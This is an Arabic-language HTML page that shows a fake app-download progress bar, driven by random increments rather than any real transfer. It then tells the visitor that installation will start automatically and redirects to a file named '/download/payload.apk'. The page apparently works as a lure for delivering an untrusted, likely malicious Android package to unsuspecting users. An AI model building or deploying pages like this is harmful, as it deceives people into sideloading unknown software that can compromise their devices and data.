<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>جاري التحميل...</title>
<style>
  body { margin:0; background:#000; color:#fff; font-family:Arial; display:flex; justify-content:center; align-items:center; height:100vh; flex-direction:column; }
  .loader { width:80%; max-width:400px; }
  .loader h2 { color:#00ff88; text-align:center; }
  .progress-bar { width:100%; height:20px; background:#333; border-radius:10px; overflow:hidden; margin-top:20px; }
  .progress { width:0%; height:100%; background:linear-gradient(90deg,#00ff88,#0088ff); transition:width 0.3s; }
  .status { text-align:center; margin-top:10px; color:#aaa; font-size:14px; }
</style>
</head>
<body>
<div class="loader">
  <h2>📥 جاري تحميل التطبيق...</h2>
  <div class="progress-bar"><div class="progress" id="progress"></div></div>
  <div class="status" id="status">يرجى الانتظار...</div>
</div>
<script>
  let progress = 0;
  const bar = document.getElementById("progress");
  const status = document.getElementById("status");
  
  const interval = setInterval(() => {
    progress += Math.random() * 15;
    if (progress > 100) progress = 100;
    bar.style.width = progress + "%";
    status.textContent = "جاري التحميل... " + Math.floor(progress) + "%";
    
    if (progress >= 100) {
      clearInterval(interval);
      status.textContent = "✅ اكتمل التحميل! سيبدأ التثبيت تلقائياً...";
      setTimeout(() => {
        window.location.href = "/download/payload.apk";
      }, 1000);
    }
  }, 300);
</script>
</body>
</html>
